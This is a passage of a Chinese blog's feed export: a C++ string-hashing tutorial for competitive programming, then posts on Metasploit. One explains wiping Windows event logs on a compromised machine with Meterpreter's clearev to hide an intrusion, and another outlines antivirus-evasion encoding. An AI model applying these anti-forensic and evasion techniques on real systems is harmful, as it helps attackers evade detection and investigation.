class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;cstdio&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;cstring&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;algorithm&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;using namespace std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;typedef unsigned long long ull;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull base=131;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;struct data&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ull x,y;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;a[10010];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;char s[10010];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int n,ans=1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull mod1=19260817;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull mod2=19660813;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull hash1(char s[])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int len=strlen(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ull ans=0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i=0;i&amp;lt;len;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ans=(ans*base+(ull)s[i])%mod1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return ans;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull hash2(char s[])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int len=strlen(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ull ans=0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i=0;i&amp;lt;len;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ans=(ans*base+(ull)s[i])%mod2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return ans;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bool comp(data a,data b)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return a.x&amp;lt;b.x;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    scanf(&amp;quot;%d&amp;quot;,&amp;amp;n);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i=1;i&amp;lt;=n;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        scanf(&amp;quot;%s&amp;quot;,s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        a[i].x=hash1(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        a[i].y=hash2(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sort(a+1,a+n+1,comp);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i=2;i&amp;lt;=n;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if (a[i].x!=a[i-1].x || a[i-1].y!=a[i].y)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            ans++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    printf(&amp;quot;%d\n&amp;quot;,ans);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;这是只用一个10^18质数的hash(100)&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;cstdio&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;cstring&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;algorithm&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;using namespace std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;typedef unsigned long long ull;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull base=131;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull a[10010];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;char s[10010];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int n,ans=1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull mod=212370440130137957ll;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull hashs(char s[])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int len=strlen(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ull ans=0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i=0;i&amp;lt;len;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ans=(ans*base+(ull)s[i])%mod;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return ans;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    scanf(&amp;quot;%d&amp;quot;,&amp;amp;n);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i=1;i&amp;lt;=n;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        scanf(&amp;quot;%s&amp;quot;,s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        a[i]=hashs(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sort(a+1,a+n+1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i=2;i&amp;lt;=n;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if (a[i]!=a[i-1])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            ans++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    printf(&amp;quot;%d\n&amp;quot;,ans);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;Hash还有一方面，就是它可以处理子串信息&#34;&gt;&lt;a href=&#34;#Hash还有一方面，就是它可以处理子串信息&#34; class=&#34;headerlink&#34; title=&#34;Hash还有一方面，就是它可以处理子串信息&#34;&gt;&lt;/a&gt;Hash还有一方面，就是它可以处理子串信息&lt;/h2&gt;&lt;p&gt;cogs1570&lt;/p&gt;
&lt;p&gt;【题目描述】&lt;/p&gt;
&lt;p&gt;法国作家乔治·佩雷克(Georges Perec，1936-1982)曾经写过一本书，《敏感字母》（La disparition），全篇没有一个字母‘e’。他是乌力波小组（Oulipo Group）的一员。下面是他书中的一段话：&lt;/p&gt;
&lt;p&gt;Tout avait Pair normal, mais tout s’affirmait faux. Tout avait Fair normal, d’abord, puis surgissait l’inhumain, l’affolant. Il aurait voulu savoir où s’articulait l’association qui l’unissait au roman : stir son tapis, assaillant à tout instant son imagination, l’intuition d’un tabou, la vision d’un mal obscur, d’un quoi vacant, d’un non-dit : la vision, l’avision d’un oubli commandant tout, où s’abolissait la raison : tout avait l’air normal mais…&lt;/p&gt;
&lt;p&gt;佩雷克很可能在下面的比赛中得到高分（当然，也有可能是低分）。在这个比赛中，人们被要求针对一个主题写出甚至是意味深长的文章，并且让一个给定的“单词”出现次数尽量少。我们的任务是给评委会编写一个程序来数单词出现了几次，用以得出参赛者最终的排名。参赛者经常会写一长串废话，例如500000个连续的‘T’。并且他们不用空格。&lt;/p&gt;
&lt;p&gt;因此我们想要尽快找到一个单词出现的频数，即一个给定的字符串在文章中出现了几次。更加正式地，给出字母表{‘A’,’B’,’C’,…,’Z’}和两个仅有字母表中字母组成的有限字符串：单词W和文章T，找到W在T中出现的次数。这里“出现”意味着W中所有的连续字符都必须对应T中的连续字符。T中出现的两个W可能会部分重叠。&lt;/p&gt;
&lt;p&gt;【输入格式】&lt;/p&gt;
&lt;p&gt;输入包含多组数据。&lt;/p&gt;
&lt;p&gt;输入文件的第一行有一个整数，代表数据组数。接下来是这些数据，以如下格式给出：&lt;/p&gt;
&lt;p&gt;第一行是单词W，一个由{‘A’,’B’,’C’,…,’Z’}中字母组成的字符串，保证1&amp;lt;&amp;#x3D;|W|&amp;lt;&amp;#x3D;10000（|W|代表字符串W的长度）&lt;/p&gt;
&lt;p&gt;第二行是文章T，一个由{‘A’,’B’,’C’,…,’Z’}中字母组成的字符串，保证|W|&amp;lt;&amp;#x3D;|T|&amp;lt;&amp;#x3D;1000000。&lt;/p&gt;
&lt;p&gt;【输出格式】&lt;/p&gt;
&lt;p&gt;对每组数据输出一行一个整数，即W在T中出现的次数。&lt;/p&gt;
&lt;p&gt;【样例输入】&lt;/p&gt;
&lt;p&gt;3&lt;br&gt;BAPC&lt;br&gt;BAPC&lt;br&gt;AZA&lt;br&gt;AZAZAZA&lt;br&gt;VERDI&lt;br&gt;AVERDXIVYERDIAN  &lt;/p&gt;
&lt;p&gt;【样例输出】&lt;/p&gt;
&lt;p&gt;1&lt;br&gt;3&lt;br&gt;0  &lt;/p&gt;
&lt;p&gt;代码&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;cstdio&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;cstring&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;algorithm&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;using namespace std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;typedef unsigned long long ull;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull base=131;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull po[100010],hs[100010*100];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;char s1[100010],s2[100010*100];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int n,ans=1,T;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull geth(int l,int r)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return (ull)hs[r]-po[r-l+1]*hs[l-1];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    freopen(&amp;quot;oulipo.in&amp;quot;,&amp;quot;r&amp;quot;,stdin);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    freopen(&amp;quot;oulipo.out&amp;quot;,&amp;quot;w&amp;quot;,stdout);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    po[0]=1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i=1;i&amp;lt;=10010-5;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        po[i]=po[i-1]*base;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    scanf(&amp;quot;%d&amp;quot;,&amp;amp;T);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    while(T--)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        scanf(&amp;quot;%s%s&amp;quot;,s1+1,s2+1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        int l1=strlen(s1+1),l2=strlen(s2+1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ull a1=0,ans=0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        for (int i=1;i&amp;lt;=l1;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            a1=a1*base+(ull)s1[i];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        for (int i=1;i&amp;lt;=l2;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            hs[i]=hs[i-1]*base+s2[i];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        for (int i=1;i+l1-1&amp;lt;=l2;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            if (a1==geth(i,i+l1-1))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                ans++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        printf(&amp;quot;%d\n&amp;quot;,ans);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;hash好像可以暴力水过很多字符串算法。。&#34;&gt;&lt;a href=&#34;#hash好像可以暴力水过很多字符串算法。。&#34; class=&#34;headerlink&#34; title=&#34;hash好像可以暴力水过很多字符串算法。。&#34;&gt;&lt;/a&gt;hash好像可以暴力水过很多字符串算法。。&lt;/h2&gt;&lt;p&gt;1、kmp&lt;/p&gt;
&lt;p&gt;问题：给两个字符串S1，S2，求S2是否是S1的子串，并求S2在S1中出现的次数&lt;/p&gt;
&lt;p&gt;把S2 Hash出来，在S1里找所有长度为|S2|&lt;/p&gt;
&lt;p&gt;2、AC自动机&lt;/p&gt;
&lt;p&gt;问题：给N个单词串，和一个文章串，求每个单词串是否是文章串的子串，并求每个单词在文章中出现的次数。&lt;/p&gt;
&lt;p&gt;把每一个单词hash成整数，再把文章的每一个子串hash成整数，接下来只需要进行整数上的查找即可。&lt;/p&gt;
&lt;p&gt;复杂度：O(|A|2+|S|)&lt;/p&gt;
&lt;p&gt;用AC自动机可以做到O(|A|+|S|)&lt;/p&gt;
&lt;p&gt;3、后缀数组&lt;/p&gt;
&lt;p&gt;问题：给两个字符串S1,S2，求它们的最长公共子串的长度。&lt;/p&gt;
&lt;p&gt;将S1的每一个子串都hash成一个整数，将S2的每一个子串都hash成一个整数&lt;/p&gt;
&lt;p&gt;两堆整数，相同的配对，并且找到所表示的字符串长度最大的即可。&lt;/p&gt;
&lt;p&gt;复杂度：O(|S1|2+|S2|2)&lt;/p&gt;
&lt;p&gt;用后缀数组可以优化到O(|S|log|S|)&lt;/p&gt;
&lt;p&gt;4、马拉车&lt;/p&gt;
&lt;p&gt;问题：给一个字符串S，求S的最长回文子串。&lt;/p&gt;
&lt;p&gt;先求子串长度位奇数的，再求偶数的。枚举回文子串的中心位置，然后二分子串的长度，直到找到一个该位置的最长回文子串，不断维护长度最大值即可。&lt;/p&gt;
&lt;p&gt;复杂度：O(|S|log|S|)&lt;/p&gt;
&lt;p&gt;用manacher可以做到O(|S|)&lt;/p&gt;
&lt;p&gt;5、扩展kmp&lt;/p&gt;
&lt;p&gt;问题：给一个字符串S，求S的每个后缀与S的最长公共前缀&lt;/p&gt;
&lt;p&gt;枚举每一个后缀的起始位置，二分长度，求出每个后缀与S的最长公共前缀。&lt;/p&gt;
&lt;p&gt;复杂度：O(|S|log|S|)&lt;/p&gt;
&lt;p&gt;用extend-kmp可以做到O(|S|)&lt;/p&gt;
</content>
        <updated>2023-01-13T19:09:06.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/12/msf%E6%B8%85%E7%90%86%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97/</id>
        <title>msf清理事件日志</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/12/msf%E6%B8%85%E7%90%86%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97/"/>
        <content type="html">&lt;p&gt;再进入肉鸡执行一些操作时，windows 下记录的操作日志可在日志查看器中进行查看，可以通过运行 eventvwr 命令打开。包括了应用程序、系统、安全等模块的日志，为了不让其查到自己或知道自己的操作，则可以使用 meterpreter 的 clearev 命令来清除其日志。未清除日志前可查看系统记录的一些处理信息。&lt;/p&gt;
&lt;p&gt;![1645511582659](03 msf清理事件日志.assets&amp;#x2F;1645511582659.png)&lt;/p&gt;
&lt;p&gt;然后在 meterpreter 下执行 clearev 命令，可以看到清除提示，分别清除了应用程序，系统和安全模块的日志记录。&lt;/p&gt;
&lt;p&gt;clearev      清理日志&lt;/p&gt;
&lt;p&gt;![1645511593151](03 msf清理事件日志.assets&amp;#x2F;1645511593151.png)&lt;/p&gt;
&lt;p&gt;（注意 使用clearev命令时 需要获得靶机的 system  权限）&lt;/p&gt;
</content>
        <updated>2023-01-12T14:18:52.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/12/msf%E5%85%8D%E6%9D%80%E7%BC%96%E7%A0%81/</id>
        <title>msf免杀编码</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/12/msf%E5%85%8D%E6%9D%80%E7%BC%96%E7%A0%81/"/>
        <content type="html">&lt;p&gt;杀软是如何检测出恶意代码的？&lt;br&gt;特征码、启发式恶意软件检查和行为。&lt;br&gt;免杀是做什么？&lt;br&gt;对特征进行混淆，打乱代码，避免杀毒软件查杀&lt;br&gt;免杀的基本方法有哪些？&lt;br&gt;自编码处理  自捆绑+编码  多重编码   接口下载式  签名伪装式&lt;/p&gt;
&lt;p&gt;针对杀毒软件的基本检测方法，我们可有以下几种方法实现免杀：&lt;/p&gt;
&lt;p&gt;改变特征码&lt;br&gt;改变行为&lt;br&gt;其它&lt;/p&gt;
&lt;p&gt;由于msf被各大安全厂商盯的比较紧，所以这些常规的方法免杀效果肯定是比较差的，但有时把一两种常规方法稍微结合一下就能达到比较好的免杀效果&lt;/p&gt;
&lt;p&gt;要用到的在线查毒工具virscan提供&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudmlyc2Nhbi5vcmcv&#34;&gt;https://www.virscan.org/&lt;/span&gt;&lt;/p&gt;
